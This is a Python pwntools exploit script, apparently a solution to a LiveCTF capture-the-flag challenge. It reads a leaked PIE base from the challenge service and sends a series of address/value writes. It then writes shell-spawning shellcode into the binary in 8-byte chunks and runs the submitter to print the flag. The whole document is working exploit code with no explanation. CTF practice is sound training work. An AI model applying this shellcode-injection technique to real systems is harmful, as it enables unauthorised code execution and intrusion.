#!/usr/bin/env python3

from pwn import *

context.arch='amd64'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
# io = process('./handout/challenge', level='debug')
pie = u64(io.recv(8))
# pause()
#log.info('[PIE] %#x'%pie)
io.send(p64(pie + 0x4330))
io.send(p64(pie + 0x1370))
io.send(p64(pie + 0x4338))
io.send(p64(pie + 0x2000))
io.send(p64(pie + 0x45b4))
io.send(p64(0))
io.send(p64(pie + 0x45b8))
io.send(p64(0))

io.send(p64(0))
io.send(p64(0x4141414141414141))

io.send(b'\x00')


sc = asm(shellcraft.sh())
io.send(p64(pie + 0x2158))
io.send(sc[:8])
io.send(p64(pie + 0x2160))
io.send(sc[8:16])
io.send(p64(pie + 0x2168))
io.send(sc[16:24])
io.send(p64(pie + 0x2170))
io.send(sc[24:32])
io.send(p64(pie + 0x2178))
io.send(sc[32:40])
io.send(p64(pie + 0x2180))
io.send(sc[40:])

io.send(p64(0))
io.send(p64(0))

io.sendline(b'./submitter')
io.recvuntil(b'LiveCTF{')
print('LiveCTF{' + io.recvuntil(b'}').decode())